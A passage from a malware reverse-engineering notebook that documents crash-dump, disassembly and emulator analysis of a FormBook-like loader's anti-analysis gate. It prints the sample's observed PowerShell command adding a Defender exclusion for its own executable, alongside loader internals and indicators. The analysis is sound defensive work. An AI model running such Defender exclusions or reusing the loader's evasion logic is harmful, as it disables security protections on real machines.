    rva 0x2dca9   unclassified

The known one disassembles cleanly and matches this file exactly, down to the
`push esi ; call +0x2cd91` that follows it. **The other two do not, and neither
is being called a second store site.** Both sit where a linear sweep
desynchronises — `0xd808` reads as `push 0x32dfd514 ; pushal` off the back of a
run of zero bytes, `0x2dca9` does not surface as an operand at all. That is
precisely the tool failure recorded above, where a desynchronising sweep dropped
20 of 65 call sites, so **they are unclassified, not data and not code**.

**What would classify them**: whether either address was ever *executed*. A block
hook over stage 3's range across a full run, checked against `0xd808` and
`0x2dca9`, answers it by measurement instead of by disassembly — the method that
has been wrong every time on this chain.

**One durable fact fell out of the scan.** The carved `stage3_native_e84f7824`
contains **zero** occurrences of the constant *and* zero of the `+0x6d8`
displacement; the 540M allocation dump has 3 and 23. Anything about this gate
must be read from `stage3_alloc_at540M_dc038cc7`, because in the carved copy
those bytes are still encrypted.

**THE RULES FIRED. This is the first time.** The report records three matches on
process memory and not on disk:

    RingForge_FormBook_422e30ed_ContextCookie
    RingForge_Loader_422e30ed_Stage2
    RingForge_Split_API_Injection_Loader

`0aw`'s parent section notes that before the baseline was rebuilt, **no run this
project ever did had scanned one of its own rules**. This is that run. All three
are memory-only, which is the property they were written for, and the pipeline
files them under T1027 and T1140 off its own evidence rather than off a note.

**The crash, recorded exactly, and C4 is direct rather than inferred:**

    RegSvcs.exe  pid 5272  exception c0000005  fault offset 01012c7c
    image C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
    "Executed From Unmapped Memory", 1 crash dump collected

Twelfth consecutive crash. The fault offset is worth carrying forward: earlier
entries record the *value read* (`0x32dfd514`) and the emulator's rva
(`0x2c53`), but not the guest's faulting EIP. `0x01012c7c` is a number to
compare the next run against.

**New behaviour, and it is not small.** The sample's PowerShell child
(pid 1988) runs:

    Add-MpPreference -ExclusionPath "C:...

That is a **Defender exclusion**, T1562.001, twelve script blocks recorded and
one graded high. It has not appeared in this file before.

**The attribution caveat is resolved, and it is the sample's.** The concern was
real — `bootstrap_tools.ps1` calls the *same cmdlet* to keep Defender off the
tools directory, and this project has twice caught its own tooling contaminating
a detector. The excluded path settles it, and it is not the tools directory:

    parent 8168 (the sample) -> powershell.exe 1988
    Add-MpPreference -ExclusionPath
      "C:\projects\RingForge_Analyzer\ringforge-workbench\samples\422e30ed…\422e30ed….exe"

**The sample excludes its own executable from Defender**, spawning PowerShell to
do it. New IOC, and the first behaviour this chain has shown that is neither
loader mechanics nor anti-analysis.

**And it confirms the WOW64 redirector independently.** The command line asks for
`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`; the image Sysmon
actually records is `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`.
A 32-bit process asked for `System32` and Windows gave it `SysWOW64` — which is
exactly the behaviour `resolve_dos_path` was taught this session, arrived at from
a 32-bit `powershell.exe`'s loader list rather than from the sample. **Two
independent routes to the same fact**, one on the bench and one on the guest, and
they agree.

**Containment confirmed the way `WORKFLOW` insists** — `network_isolation:
single egress path (1)`, read from the summary rather than the GUI line.

**One loose end for whoever picks this up.** Sysmon counted
`CreateRemoteThread: 2` while the injection section reports 0 and
`Sysmon Highlights: 0`. Both are probably excluded as analyzer or baseline
events — 45 analyzer events and 2 Windows-baseline events were filtered — but
"filtered" and "absent" are different claims and this file has been bitten by
that distinction twice.

#### 0ax. THE CRASH DUMP — `[ctx+0x6d8]` is a COOKIE, and the field's census

`RegSvcs.exe.5272.dmp`, 12.6 MB, read with `dynamic_analysis/minidump.py`.

**The blind spot in `0aw` is closed.** That entry bounded its own negative:
"an image loaded and unloaded outside Procmon's window would not appear".

    loaded modules   : 6
    unloaded modules : 0
    hashing to 0xe11da208, loaded or unloaded : NONE

**Zero unloaded modules**, so nothing was injected-and-unloaded and the bound is
lifted rather than merely acknowledged. Six loaded modules — even fewer than the
nine images Procmon saw — is another look at the same fact as the missing CLR.

**The injected image is at `0x01010000` on the guest, and it is our image.** The
constant `0x32dfd514` occurs three times inside it, at rvas `0xd809`, `0x16065`
and `0x2dca9` — **the same three rvas** the bench found in
`stage3_alloc_at540M_dc038cc7`. Guest and artifact are the same bytes.

**The reachability question from `0aw` is answered, and the answer is not what
was proposed.** All 18 references to `+0x6d8` in the guest's image, classified by
opcode:

    16 reads   mov reg,[r+0x6d8] / cmp / add / xor      most feeding an XOR
     1 store   mov dword [esi+0x6d8], 0x32dfd514        rva 0x1605f  <- the gate
     1 store   mov dword [esi+0x6d8], eax               rva 0x26c91  <- computed

**There is exactly one store of that constant**, so the "second hardcoded store"
idea is dead. The other two occurrences of the constant are `push 0x32dfd514`,
both preceded by an identical `e8 00 00 00 00 58 c3` — a GetPC thunk — and
neither writes the field.

**But `[ctx+0x6d8]` is a cookie, not a buffer base**, and that reframes
everything above it in this file. The reads look like this:

    mov edx, dword ptr [esi + 0x6d8]
    xor edx, eax
    mov dword ptr [esi + 0x78c], eax
    mov dword ptr [esi + 0x6a0], edx

That is **XOR obfuscation of values held elsewhere in the context** — store
`x ^ cookie`, recover with `^ cookie`. It is also exactly what
`RingForge_FormBook_422e30ed_ContextCookie` anchors on, which is why that rule
works.

**And the normal initialiser is the *other* store.** `rva 0x26c91` takes its
value from a preceding `call`, i.e. a computed cookie. **The gate's store is the
anomaly**: a *hardcoded* cookie where the sample would normally compute one.

**The fault, read from the guest for the first time:**

    eip 0x01012c7c  =  rva 0x2c7c  =  cmp al, byte ptr [esi + ecx]

surrounded by `cmp al,dl / je / movzx / sub eax,0x20 / cmp eax,edx` — the
`sub 0x20` is an ASCII case fold, so this is a **case-insensitive string
compare** walking `[esi+ecx]`. `esi` is a string base. The emulator's rva was
`0x2c53`; `0x2c7c` is the guest's, and this file already predicted the two would
differ because the routine reads from several paths depending on the needle.

**The leading model, with the unverified step marked.** A pointer is recovered as
`stored ^ cookie`; if `stored` were never initialised the recovery yields the
cookie itself, `0x32dfd514`, and the string compare faults reading it. That
would need **both** the hardcoded cookie *and* an uninitialised pointer, and it
explains why forging a module name reproduced the fault exactly. **Not
verified**: the seven copies of the cookie in heap memory sit in contexts whose
`+0x6a0` and `+0x78c` read as zero, which is consistent with the model and
equally consistent with ordinary zeroed heap. Do not promote this to a finding
without measuring the stored value at the moment of the recovery.

**Where the question now sits.** Only one instruction writes the constant, so the
gate is the only hardcoded route — but `rva 0x26c91` writes *whatever is in
eax*, and there are two `push 0x32dfd514` sites in the image. **Can the computed
store ever write the constant?** Answered in `0ay`: no, and what it writes
instead is the finding.

#### 0ay. THE COOKIE IS NORMALLY A SELF-ADDRESS — the gate swaps in a constant

`scripts/cookie_stores.py` hooks both store sites in a fresh stage-3 run from the
entry point. 632,962,985 blocks to a clean exit, which matches the 629M this file
already records.

    [    9,868,455blk] computed  -> [0x002fedfc] = 0x02002be1
    STORE EXECUTIONS: 0 gate, 1 computed

**The computed store never writes the constant.** One execution, one value —
and the value is `0x02002be1`, which is **inside stage 3's own allocation** at
`0x02001000`. The cookie is not a random number: it is a **runtime self-address**.

**That explains the GetPC thunks.** `0ax` found both extra copies of the constant
sitting behind an identical `e8 00 00 00 00 / 58 / c3` — call-next, pop, return,
the standard way position-independent code learns its own address. A self-address
cookie is exactly what that idiom is for.

**So the gate substitutes a hardcoded constant for a runtime address**, and that
is a very different act from "poisoning a pointer". Every value in the context is
stored as `x ^ cookie` and recovered with `^ cookie`. Replace the cookie *after*
values have been stored under the old one and **every recovery in the context
yields garbage** — including the string pointer that `rva 0x2c7c` walks with
`cmp al,[esi+ecx]`, which is where the guest died.

**This moves the balance toward deliberate bail.** A build that merely broke
would not swap one specific field for one specific constant on one specific
branch; corrupting a cookie is a designed way to kill a process so that it looks
like a crash rather than a detection. The two readings this file has carried
since the crash was located are no longer equally weighted — **but neither is
retired**, because the question the guest poses is untouched by any of this:
**why did it take the branch, with no matching module loaded or unloaded?**

**One scope caveat, and it was a live lead.** "Only one instruction writes the
constant" means only one *in stage 3's image, directly*. The guest's dump holds
**seven** copies of the cookie, and a `memcpy` of a context propagates the field
without touching `+0x6d8` by name — so a context clone looked like the next place
to look. **`0az` tested it and it is not the answer.**

#### 0az. THE CRASH REPRODUCES EXACTLY, and the clone lead is dead

`scripts/cookie_spread.py` runs stage 3 with `RINGFORGE_FORGE_MODULE=1`, which
puts a module hashing to `0xe11da208` in the loader list. **That is a fed answer
and the run is only worth what that allows**: `0aw` and `0ax` together show the
guest had no such module, loaded or unloaded. This reproduces the *state* in
order to watch what follows, which is a much weaker claim than explaining it.

    [17,334,001blk] GATE fired -> [0x002fedfc] = 0x32dfd514
    stopped: Invalid memory read at eip 0x02003c53
      after 17,347,692 blocks, rva 0x2c53
      first fault: read at 0x32dfd514 from eip 0x02003c53

**17,347,692 blocks and rva `0x2c53`** — the same numbers this file recorded
when the branch was first forced, to the block. The bench reproduction is exact.
The guest died at rva `0x2c7c` instead, which is the divergence this file already
predicted from the compare routine reading by several paths.

**And the spread is tiny, which kills the clone hypothesis:**

    inside the allocation : 3   (guest: 3, same rvas)
    elsewhere             : 3   (guest: 7)
       0x002fe55c, 0x002fe560, 0x002fedfc  -- all stack, all adjacent to the store

One gate store, and the value reaches only two further stack slots — `0x2fe55c`
and `0x2fe560` are a **4-byte-apart pair**, the same adjacency the guest shows at
`0xd3e198`/`0xd3e19c`. There is no `memcpy` fan-out into cloned contexts. **The
crash needs the single store and nothing else**, so the guest's extra copies are
downstream of the fault, not a route to it.

**Which returns the question, unchanged and now well isolated:** the guest's
cookie held the hardcoded constant; only `rva 0x1605f` writes it; that
instruction is gated on a module the guest did not have. Nothing about
propagation explains it, and neither does a second store site.

**A structural difference worth carrying, not yet a finding.** The bench's
context is on the **stack** (`0x2fe724`); the guest's copies are on the **heap**
(`0xc3f554`, `0xd3d180`, …). That could be this harness's layout or a real
difference in how stage 3 ran on the guest, and nothing here distinguishes them.

**And the `0aa` trap caught a fourth script — this one.** `cookie_spread.py`
first shipped with `--blocks 100_000_000`, which is an *instruction* budget: it
stopped at 11,886,450 blocks, short of the crash, and printed
**"GATE EXECUTIONS: 0"** as though the gate had declined. Written by someone who
had read `0aa` that morning and fixed the same shape in `stage3_tail.py` and
`stage4_gate.py` the same day. It now has the EIP check and so does
`cookie_stores.py`, which had the same latent hole. **The lesson is not "remember
the budget" — it is that every probe needs the check built in before its first
run, because the author is exactly who will forget.**

#### 0ba. THE HEAP/STACK LEAD IS DEAD — the guest's copies are on its stack, 17 Aug

The 17 Aug pick-up entry called this "the only structural difference left on
that path" and "the obvious next thread": the bench's context sits on the stack,
the guest's copies on the heap. **The word "heap" was never measured, and it is
wrong.** `scripts/guest_cookie_regions.py` classifies every copy against the
dump's own `THREAD_LIST` and `MEMORY_INFO_LIST`:

    0x00c3fc2c   PRIVATE COMMIT RW   region 0xc38000+0x8000
    0x00d3d858   THREAD STACK of tid 2180
    0x00d3d938   THREAD STACK of tid 2180
    0x00d3dad8   THREAD STACK of tid 2180
    0x00d3e198   THREAD STACK of tid 2180
    0x00d3e19c   THREAD STACK of tid 2180
    0x00d3e9e8   THREAD STACK of tid 2180
    0x0101d809 / 0x01026065 / 0x0103dca9   rvas 0xd809 / 0x16065 / 0x2dca9

**Six of the seven are on the single thread's stack** (`0xd3d3bc..0xd40000`),
and exactly one — `0xc3fc2c` — is private committed memory that could fairly be
called heap. The bench's three sit on *its* stack at `0x2fe55c`, `0x2fe560`,
`0x2fedfc`. **Same shape, so there is no divergence to explain and the thread is
closed.** The addresses `0az` quoted as heap (`0xc3f554`, `0xd3d180`) match no
copy in the dump at all.

**What survives is the corroboration, and it is stronger now.** `0az` noticed
that the guest's `0xd3e198`/`0xd3e19c` pair is 4 bytes apart like the bench's
`0x2fe55c`/`0x2fe560`. Both pairs are now known to be on a stack, which is what
makes the parallel mean something.

**Two facts the same read produced, neither of them looked for:**

- **The crashed `RegSvcs` had exactly one thread.** Whatever stage 3 did, it did
  it without spawning one.
- **Stage 3 ran from `PRIVATE COMMIT RWX`, `0x1010000 + 0x46000`** — a private
  RWX allocation rather than a mapped section, and the same `0x46000` the
  emulator allocates. The module list carries `RegSvcs.exe` twice, at `0x400000`
  with timestamp `0x5ff2b99b` and at `0x990000` with `0x68531ee1`, which is the
  WER hollowing finding visible a second way.

**The reader grew what this needed, with tests.** `dynamic_analysis/minidump.py`
gains `threads()`, `memory_info()` and `region_of()`; suite 640 → 650, and the
`slow` real-dump test now cross-checks the two streams against each other by
requiring every thread stack to fall inside a named region. One layout note
worth the same treatment as the unloaded list: **`MINIDUMP_MEMORY_INFO_LIST`'s
count is a `ULONG64` where the unloaded module list's is a `ULONG32`.** Reading
it as 32 bits returns the right number on every small dump and shifts the first
entry four bytes; there is a test that pins it.

**Two repo loose ends closed the same day, and one was a live defect.** The
2,471-name host inventory sat **untracked at the repo root as
`guestloaded.txt`** — a host list under a guest name, next to the real
`docs/guestloaded.txt`. `crack_name_hashes.py` reads it, and skipped it in
silence when absent, so **every fresh clone ran the hash sweeps against 1,675
fewer names and reported "no match" exactly like a complete run.** That is the
`collection_available` failure in corpus form, in the one place this project has
already been burned by a missing corpus *population* (`sbiedll.dll`). It is now
`docs/hostloaded.txt`, tracked, and a missing corpus prints a warning outside
`verbose`. `.claude/settings.json` is tracked; `settings.local.json` is ignored,
since it accumulates absolute scratchpad paths from other projects.

> **Instrument bug, and it is the `0aa` shape in a new place.**
> `memory_ranges()` returns `(virtual_address, file_offset, size)`. The first
> pass here unpacked it as `(va, size, offset)` and reported **559 copies of the
> constant**, at plausible addresses, in plausible-looking regions, with a
> plausible repeating-offset pattern that invited a whole theory about the same
> blob being mapped many times. Nothing about it looked wrong. It was caught
> only because the count disagreed with `0ax` — which is exactly why
> `guest_cookie_regions.py` re-derives the census from the file and prints the
> comparison rather than trusting the number. **A probe that reproduces a prior
> measurement is cheap; one that assumes it is not a probe.**

#### 0bb. THE `+0x6d8` CENSUS IS 23 SITES, NOT 18 — and one of the five is the interesting one

`0ax` reported "18 references in stage 3's decrypted image, 16 of them reads
feeding an XOR recovery, and exactly two stores". Re-derived by anchoring on the
displacement bytes `d8 06 00 00` and decoding backwards from each: **23 raw
occurrences, 23 decodable, each with exactly one candidate decoding.** 21 reads
and the same 2 stores.

> **"Five short" is withdrawn — `0ax` counted a different image, correctly.**
> `0bg` diffed the guest's executing copy against the bench artifact: `0ax`
> swept the *guest's*, which has 18 decodable sites, and this swept the bench's
> at 540M blocks, which has 23. The five below sit inside regions the guest had
> **not yet decrypted**. Two right answers about two images. What stands is that
> the sites are real and that `rva 0x1601b` had never been written down.

**`0ay` and `0az` are untouched by this** — they rest on the store census, which
is unchanged. The five reads not in the guest's copy include `rva 0x1601b`,
seven bytes before the gate block:

    0x16012  jne  0x1601b
    0x16014  xor  al, al ; pop esi ; mov esp, ebp ; pop ebp ; ret
    0x1601b  cmp  dword [esi+0x6d8], 0        <-- MISSED BY 0ax
    0x16022  jne  0x16038                      <-- cookie already set: skip init
    0x16024  lea  eax, [ebp-0x24] ; push eax ; push esi
    0x16030  call 0x2b011                      <-- initialise the cookie
    0x16038  push 0xd3 ; push 0x246e8fe6
    0x16046  call 0x4181                       <-- the XOR decoder
    0x1604b  push eax
    0x1604c  call 0x2dc01                      <-- get_module_base_by_hash
    0x16054  test eax, eax
    0x16056  je   0x16069                      <-- not found: skip the store
    0x16058  mov  byte [esi+0x138], 1
    0x1605f  mov  dword [esi+0x6d8], 0x32dfd514
    0x16069  push esi ; call 0x2dd91

**So the gate block's first act is to make sure the cookie is set, and its last
is to replace it with the constant.** The computed store fires at 9,868,455
blocks (`0ay`) and this block runs at ~17.3M, so the field is already non-zero
here and `0x2b011` is skipped — the gate is **overwriting a live cookie**, never
initialising a blank one. That is the ordering `0ay` inferred from the two store
sites, now read off the control flow.

**Also: `0xe11da208` is not an immediate here.** It is produced by the decoder at
`0x4181` from `(0xd3, 0x246e8fe6)`, the same call shape as the twenty blocklist
constants. Nothing in this section changes what the gate tests; it names where
the value comes from.

**A correction to *Why it crashes*.** That section annotates `je 0x16014` as
`<-- retry loop`. `0x16014` is `xor al,al ; pop esi ; mov esp,ebp ; pop ebp ;
ret` — **a return-0 epilogue**, not a loop. Nothing was built on the annotation,
but it is wrong wherever it is read.

**And the two `push 0x32dfd514` sites are stubs in a thunk table**, not code
that touches the context:

    0x0d808  push 0x32dfd514 ; pushad ; call 0xd031  ; popad ; ret
    0x2dca8  push 0x32dfd514 ; pushad ; call 0x2e111 ; popad ; ret

Both sit immediately after an `e8 00 00 00 00 / 58 / c3` GetPC thunk, in a run
of them (`rva 0x2f9b0` onward is nothing but such stubs). The constant is
therefore **an argument the obfuscator's runtime already uses for something**,
independent of the cookie — which is a lead about what `0x32dfd514` *means* to
this author, and is not yet followed.

#### 0bc. ONE CONTEXT, ON THE STACK, AND NOTHING READS THE COOKIE BEFORE IT IS WRITTEN

`scripts/cookie_contexts.py` hooks all 23 sites from `0bb` and records the base
register at every execution. A clean run, no forged module, to the same
632,962,985 blocks and the same clean exit `0ay` reports:

    SITES THAT EXECUTED: 14 of 23
    DISTINCT CONTEXT BASES: 1
       0x002fe724  STACK  first at 9,868,455blk (rva 0x26c91), 229 hits

**There is exactly one context object in the whole run**, it is on the stack,
and 229 field accesses across 14 sites all name it. So "the guest ran a second
context path" has no bench-side counterpart to compare against, and together
with `0ba` — where the guest's copies turn out to be stack too — the whole
heap/stack line of inquiry is finished.

**The first touch of the field is `rva 0x26c91`, the computed store.** That is
an ordering fact the per-site counts cannot give and it is worth more than the
census: **no site reads the cookie before it is written.** `0ax`'s leading model
needs a recovery of an *uninitialised* pointer, and its own note said "do not
promote this to a finding without measuring the stored value at the moment of
the recovery". On this bench that half does not happen at all. It remains
possible on the guest and is now the only unmeasured step in that model.

`rva 0x1601b` executed **once**, which matches `0bb`'s reading of the gate block
as a single pass rather than a loop. `rva 0x1605f` never fired, as expected
without a module hashing to `0xe11da208`. Nine sites never ran, including all
four `edi`-based ones outside `0x24723`/`0x24737`.

> **And the probe printed a conclusion it had no business printing.** Its
> `AGAINST THE GUEST` block was written before `0ba` was measured and said
> *"The guest's heap copies are therefore a real difference"* — over numbers
> that were entirely correct. **Fourth instance of this exact shape in three
> days** (the RUN CHECK in `0aa`, `stage3_tail.py`, `stage4_gate.py`, now this),
> and the first where the author had already written the warning about it into
> the pick-up entry the same day. The RUN CHECK guards against summarising a
> *truncated* run; it does nothing about summarising a *complete* run against a
> stale premise. **A conclusion line must name the observation it rests on and
> that observation must be in the same run** — this one now cites `0ba` by name
> and prints the measured guest breakdown rather than a remembered one.

#### 0bd. `0x32dfd514` IS THE AUTHOR'S POISON ADDRESS — 17 Aug

`0bb` noticed the two non-store occurrences of the constant sit in a thunk table
as `push 0x32dfd514 ; pushad ; call ; popad ; ret`, and `Why it crashes` had read
them as "an error or abort helper's argument". **Both readings miss what the
shape does.** `pushad` and `popad` balance, and neither helper touches the stack
above its own frame — so at the trailing `ret` the stack top is the *immediate*.
The stub is:

    call <helper>  ;  jmp 0x32dfd514

`scripts/poison_thunks.py` proves it by **executing** one — assembled from
scratch, helper replaced by a bare `ret`, registers seeded with markers:

    stopped: Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)
    EIP 0x32dfd514   (the caller's return address was 0xdeadbee0)
    registers preserved across pushad/popad: True

**An execute fault, at the constant.** Neither stub returns to its caller.
Reading it off a disassembly is the method that has been retracted repeatedly
here, so it is run instead.

**And it is the only immediate used that way.** A sweep for
`68 imm32 | 60 | e8 rel32 | 61 | c3` over the whole unpacked image returns
**two stubs, both with `0x32dfd514`** — so this is not one dispatch id among
many. It is a **single designated poison address**, mapped by nothing on any
machine, which is why it is not page-aligned and why no allocation ever
explained it.

**What the helper does first is stamp a reason.** `rva 0x2e111` fetches the
context through the lazy getter at `0x15441`, writes `0xb1938` into
`[ctx+0x6a4]`, calls `0x2a011(ctx, &0x789d5f00)` and returns 0 — *then* the stub
jumps into nothing. Record why, then die. (The getter is the same one whose tail
does `call 0x2027cd1 ; mov [esi+0x14c], eax`, which is the pair the gate block
opens with — same object, and it spans at least `0x4da0` bytes.)

**What this settles, and it is the framing rather than the fact.** `0ay` said
the gate "substitutes a hardcoded constant for a runtime address" and moved the
balance toward deliberate bail while retiring neither reading. The constant now
has a *name*: the author keeps one poison address, jumps to it from two abort
stubs, and **the Sandboxie gate writes that same address into the context
cookie.** A build that merely broke does not have a designated poison address
and does not reach for it on one specific branch. **Broken build is no longer a
live reading of the store**, though nothing here proves it was reached honestly.

**What it does not settle, and the distinction matters.** The guest died on a
**read** at `0x32dfd514` from `cmp al, [esi+ecx]` — not a fetch. Neither stub
executed there, and neither executed on the bench either: the clean run reaches
`ExitProcess` at 632,962,985 blocks **with no fault at all**, and a stub that
ran would have faulted on the fetch. So the thunks explain what the value
*means*, not the path the crash took. **The standing question is untouched:**
the guest had no module hashing to `0xe11da208` and stored the poison anyway.

#### 0be. THE STAGE-4 CENSUS, RE-ESTABLISHED — and `0au` did not need a detonation

`0at` left every stage-4 finding from `0ad` to `0as` carrying *"given a create
it should not have been granted"*. This removes the qualifier, and it removes it
by **measuring the sentence the whole chain rests on** rather than by rerunning
against the same assumption.

**`0aq`, `0as` and `0at` all rest on "a real `CreateProcessW` fails on
`C:C:\…`".** That sentence eliminated readings 2 and 3 and left reading 1 alone,
and it had never been measured. It did not need a detonation to measure — whether
Windows accepts an `lpApplicationName` is a Win32 question, and this bench is a
Windows machine. `scripts/real_createprocess_paths.py` asks it directly, with
`CREATE_SUSPENDED` and an immediate terminate:

    fails ERROR_INVALID_NAME    C:C:\Windows\System32\compact.exe    <- the sample's
    fails ERROR_INVALID_NAME    C:C:\Windows\SysWOW64\compact.exe
    fails ERROR_PATH_NOT_FOUND  C:Windows\SysWOW64\compact.exe
    fails ERROR_FILE_NOT_FOUND  compact.exe
    starts                      C:\Windows\SysWOW64\compact.exe
    starts                      \Windows\SysWOW64\compact.exe
    starts                      \??\C:\Windows\SysWOW64\compact.exe
    starts                      C:\Windows\SysWOW64\where.exe        <- success control

**`ERROR_INVALID_NAME`, for all twelve candidates in the doubled form.** Reading
1 of `0aq` is now confirmed rather than assumed, and **`0au` comes off the
detonation queue answered** — it asked exactly this. The success control is not
decoration: a table where every row fails cannot be told from a probe that is
broken.

**And the harness's model was checked against the API it models.** Every earlier
test pinned `resolve_dos_path` against its own intent, which is not the same as
being right. It agrees with the real `CreateProcessW` on **every input tried**,
including all twelve doubled paths. Eight `slow` tests in
`test_createprocess_path.py` hold it there, on the same standing rule as the
`slow` minidump test.

**The census itself, from `stage4_census.py`:** 120,090,809 blocks, 12 opens, 11
creates, all refused — reproducing `0at` exactly, now on measured ground.

**Two corrections came out of it.**

**The directory is `System32`, not the `SysWOW64` that `0as` records.** A 32-bit
process's loader entry carries the *unredirected* path — `winenv` has that
measured and commented at `LOADER_SYSTEM_DIR`, and `0ar`/`0aq` predate it. The
builder appends whatever is in `FullDllName`, so what the sample actually hands
`CreateProcessW` is **`C:C:\Windows\System32\<name>`**. Both forms are rejected
identically so nothing turned on it, **but the IOC did** and it was wrong in
this file.

**There is one path construction, not two.** This probe was written to test the
opposite: that the walk builds a well-formed path for the file it *opens* and a
doubled one for the process it *creates*, which would have shown the sample can
produce the right string. It cannot. All twelve opens carry the doubling too:

    \??\C:C:\Windows\System32\compact.exe      C:C:\Windows\System32\compact.exe
    \??\C:C:\Windows\System32\msiexec.exe      C:C:\Windows\System32\msiexec.exe
    ...
    \??\C:\Windows\System32\ntdll.dll          --      (not a candidate, well formed)

So reading 1 covers **the whole walk**, not one call: this routine never
produces a usable name for any of the twelve, and `prepare_host` returns 0 on a
real machine for a reason that has nothing to do with which files exist.

**That retires `0at`'s `write.exe` explanation.** `0at` said the twelfth never
opened because "this host has no `C:\Windows\SysWOW64\write.exe`", and "a
machine that has it would show twelve". Neither survives: the open path is
`\??\C:C:\Windows\System32\write.exe`, which names nothing on **any** machine,
so file presence was never what distinguished it. Why `write.exe` alone skips
the create is now unexplained rather than explained, and it is a small open
question sitting on a settled result.

> **The `0aa` shape again, and this time it produced a whole paragraph.** The
> first version of this probe printed *"the same routine builds a correct path
> for the file it opens and a doubled one for the process it creates"* — the
> hypothesis it was written to test, stated as a finding. The detector indexed
> `path[1]` for the volume colon without stripping `\??\`, so every doubled open
> read as well formed. **Sixth instance in three days**, and the second in this
> session where a probe confirmed its author's expectation through a broken
> check rather than a broken budget. The `0aa` RUN CHECK does not catch this
> class at all: the run was complete and the numbers were right. What catches it
> is printing the evidence next to the conclusion — the table above shows
> `\??\C:C:\` on every row, and it is unreadable as agreement.

#### 0bf. THE LAST UNMEASURED STEP IS MEASURED — and the blocker was never real

The plan for this was "decide an instrumentation route for the guest, then book
a detonation". **Neither was needed.** Both remaining questions were answerable
from the dump already on disk, and the reason they had not been is that two
streams had never been read.

**First: the loader list the gate actually walks.** `0aw` hashed Procmon's
`Load Image` events; `0ax` hashed the dump's `MODULE_LIST` and
`UNLOADED_MODULE_LIST`. Both are a *writer's* view. `get_module_base_by_hash`
sees none of that — it walks `PEB->Ldr->InLoadOrderModuleList` in the process's
own memory. **That list is in the dump as ordinary memory**, and
`scripts/guest_ldr_walk.py` walks it literally: same list, same offsets, same
lowercasing, same CRC.

    TEB 0x00bdd000 -> PEB 0x00bda000 -> Ldr 0x77bf7360

    0  0x00400000  0xe2e77daf  RegSvcs.exe
    1  0x77ac0000  0x0b4e1ae2  ntdll.dll
    2  0x771d0000  0xadedab08  KERNEL32.DLL
    3  0x75e30000  0x21094b62  KERNELBASE.dll

**Four entries, walk completed cleanly, nothing hashes to `0xe11da208`.** The
probe distinguishes "walked the whole list and found nothing" from "the walk
stopped", because that distinction is the entire question — and it is the former.
The only difference from the `MODULE_LIST` stream is `wow64cpu.dll`, which
belongs to the 64-bit list and is a good sign the right list is being read.
**This is a real negative over the list the gate itself reads**, which is
strictly stronger than anything `0aw` or `0ax` could offer.

**Second: the register file at the fault.** `0ax` reconstructed the faulting
instruction from the eip in the WER report and then *reasoned* about what `esi`
must have held. The registers were in `EXCEPTION_STREAM` the whole time.

    eip  0x01012c7c    rva 0x2c7c
    esi  0x320bf2bc    edi  0x00000000    ecx  0x00d3e258
    edx  0x32dfd514    <<<< the poison, exactly
    eax  0x32dfd5f8    poison + 0xe4
    ebp  0x00d3e1a0    esp  0x00d3dcf8

**Two independent checks say the parse is real**, which matters because an x86
`CONTEXT` mis-parse (`FloatSave` is 112 bytes at `+0x1c`) shifts every register
onto its neighbour and lands on plausible values: `eip` equals the fault offset
WER recorded separately, and `esi + ecx` equals `0x32dfd514` exactly — the
arithmetic of the faulting `cmp al, [esi+ecx]` itself.

**The faulting pointer is not in a register.** `esi` is a *bias*
(`poison - 0xd3e258`) and `ecx` is a live stack address; the walked pointer is
split across the two. That is why no single register equals the faulting
address, and it is worth knowing before anyone reads `esi` as a string base
again.

**And `0ax`'s missing step lands.** `edx` holds the poison outright and `eax`
holds `poison ^ 0xec`. Two registers carrying `poison ^ small` is what
`x ^ cookie` produces when **the cookie is the poison**. `0ax` wrote *"do not
promote this to a finding without measuring the stored value at the moment of
the recovery"*; this is that measurement, and it confirms the model.

**So every link in the chain is now a measurement, and they cannot all be true:**

    the guest's cookie held 0x32dfd514        (registers, above)
    -> only rva 0x1605f writes that value      (0ax; census re-derived in 0bb)
    -> that store is gated on a module hashing to 0xe11da208
    -> the guest's own PEB->Ldr walk has four entries and none of them does

The contradiction is no longer between a measurement and an inference. **It is
between two measurements**, which is a much better place to be stuck, and it
means the next move is to attack one of the two middle links rather than to
gather more evidence about the ends. The likeliest soft spot is the second:
"only `rva 0x1605f` writes it" is a statement about *stage 3's image*, and the
guest had a `0x46000` **RWX** region it could rewrite at will (`0ba`).

> **A wrong turn worth recording, because the probe agreed with me first.**
> Before reading the registers, `guest_gate_witness.py` tried to find the
> context by treating each stack copy of the poison as a `ctx+0x6d8` and scoring
> the structure below it. It "ACCEPTED" six candidates and reported **the gate
> branch did not run** — a conclusion that would have retracted `0ay` and `0az`.
> The acceptance test only required the marker offsets to be *readable*, not to
> look like anything: one accepted candidate had `+0x4d9c = 0x00630069`, which
> is UTF-16 `"ic"`. Two of the markers were wrong as well — `+0x4d9c` is a field
> of a *different* object (the one `0x15441` fetches), and `+0x138` is `0` in a
> healthy context, so it can only ever confirm and never refute. Checked against
> a real bench context at `0x2fe724` before being believed, and thrown away.
> **Seventh instance in three days**, and the first that would have produced a
> retraction rather than an overstatement.

#### 0bg. THE GUEST RAN THE BENCH'S BYTES — self-modification is out, and `0ax` was right about 18

`0bf` left the chain with both ends measured on the guest and both middle links
still resting on the bench artifact — while the guest ran from a `0x46000`
**RWX** allocation it could rewrite at will. `scripts/guest_image_diff.py` pulls
the whole region out of the dump and compares.

    BYTES THAT DIFFER: 4,612 of 284,641 (1.62%), in 5 runs

    rva 0x139ec..0x13f17   entropy guest 7.85 / bench 5.84   guest ENCRYPTED
    rva 0x1426d..0x145ee   entropy guest 7.74 / bench 5.98   guest ENCRYPTED
    rva 0x17f9b..0x1860e   entropy guest 7.87 / bench 6.16   guest ENCRYPTED
    rva 0x1862a..0x18819   entropy guest 7.52 / bench 5.78   guest ENCRYPTED
    rva 0x2dd08..0x2de0c   entropy guest 7.18 / bench 7.26   neither -- see below

**Four of the five are the same code at different points in its own
decryption.** The bench side opens `90 90 90 90 90 90` and continues into valid
x86; the guest side is entropy 7.5–7.9. The artifact is
`stage3_alloc_at540M` — 540M blocks in — and the guest crashed far earlier, so
it simply had less of itself unpacked. This file already records that stage 3
keeps decrypting as it runs (45 hash call sites at 47M blocks, 65 by 380M).

**And that reconciles the census discrepancy — in `0ax`'s favour.** `0bb` said
*"`0ax`'s census was five reads short"*. **It was not.** `0ax` swept the
